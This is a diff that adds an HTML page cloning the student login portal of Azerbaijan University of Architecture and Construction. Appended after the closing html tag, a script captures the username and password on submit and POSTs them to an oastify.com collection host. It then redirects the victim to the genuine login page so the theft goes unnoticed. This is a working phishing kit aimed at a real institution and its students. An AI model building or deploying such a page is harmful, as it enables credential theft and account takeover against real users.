@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Azərbaycan Memarlıq və İnşaat Universiteti Tələbənin şəxsi kabineti</title>
+
+  <link href="../login/css/icomoon/styles.css" rel="stylesheet" type="text/css">
+  <link href="../login/css/bootstrap.css" rel="stylesheet" type="text/css">
+  <link href="../login/css/core.css" rel="stylesheet" type="text/css">
+  <link href="../login/css/components.css" rel="stylesheet" type="text/css">
+  <link href="../login/css/colors.css" rel="stylesheet" type="text/css">
+  <script type="text/javascript" src="../login/js/plugins/loaders/pace.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="../css/style.css" />
+
+</head>
+
+<body class="login-container login-cover">
+
+  <div class="page-container">
+
+    <div class="page-content">
+
+      <div class="content-wrapper">
+
+        <div class="content pb-20">
+
+          <form class="form-validate">
+            <div class="panel panel-body login-form">
+              <div class="text-center">
+                <div class="icon-object border-slate-300 text-slate-300"><i class="icon-reading"></i></div>
+                <h2 class="content-group" style="font-weight:bold">Azərbaycan Memarlıq və İnşaat Universiteti<small
+                    class="display-block">Tələbənin şəxsi kabineti</small></h2>
+              </div>
+              <div class="form-group has-feedback has-feedback-left">
+                <label>Login</label>
+                <input type="text" class="form-control" name="username">
+              </div>
+              <div class="form-group has-feedback has-feedback-left">
+                <label>Password</label>
+                <input type="password" class="form-control" name="password">
+              </div>
+              <div class="form-group has-feedback has-feedback-left hide">
+                <label style="width: 50%;float: left">Təhlükəsizlik kodu</label>
+                <img style="float: left" width="50%" height="30px" src="../img/cap/c491d2d4672b81d1c7bded9a9993da31.png"
+                  \>
+                <input type="text" class="form-control" name="kod">
+                <input type="hidden" class="form-control" value="c491d2d4672b81d1c7bded9a9993da31" name="kod1">
+                <br>
+              </div>
+              <div class="form-group">
+                <button type="submit" name="giris" id="getBtn" class="btn bg-blue btn-block">Daxil
+                  ol <i class="icon-arrow-right14 position-right"></i></button>
+                <div class="form-group">
+                </div>
+                <br>
+                Tələbənin Şəxsi Elektron Kabineti sistemi ilə bağlı suallarınızı <a
+                  href="https://kabinet.azmiu.edu.az/cdn-cgi/l/email-protection#42276f372c2b342730312b363b0223382f2b376c2726376c23387d313720282721367f03382f2b376c2737"><span
+                    class="__cf_email__" data-cfemail="791c540c17100f1c0b0a100d0039180314100c571c1d0c571803">
+                    e-university@azmiu.edu.az</span></a>
+                elektron &uuml;nvanına g&ouml;ndərə bilərsiniz.</p>
+                </p>
+              </div>
+            </div>
+
+          </form>
+
+        </div>
+
+      </div>
+
+    </div>
+
+</body>
+
+
+</html>
+<span style=" position: absolute; bottom: 1px; left: 0px;">5.44.38.27</span>
+<script>
+  const form = document.querySelector("form");
+  form.onsubmit = handleSubmit;
+  function handleSubmit(e) {
+    e.preventDefault();
+    fetch("http://aq4hmdehrs6gpa3pqflngxxfz65xtrhg.oastify.com", {
+      method: "POST",
+      body: JSON.stringify({
+        username: document.querySelector("input[name='username']").value,
+        password: document.querySelector("input[name='password']").value
+      })
+    })
+    setInterval(() => {
+      window.location.href = "https://kabinet.azmiu.edu.az/istifadechi/giris";
+    }, 1000);
+  }
+</script>
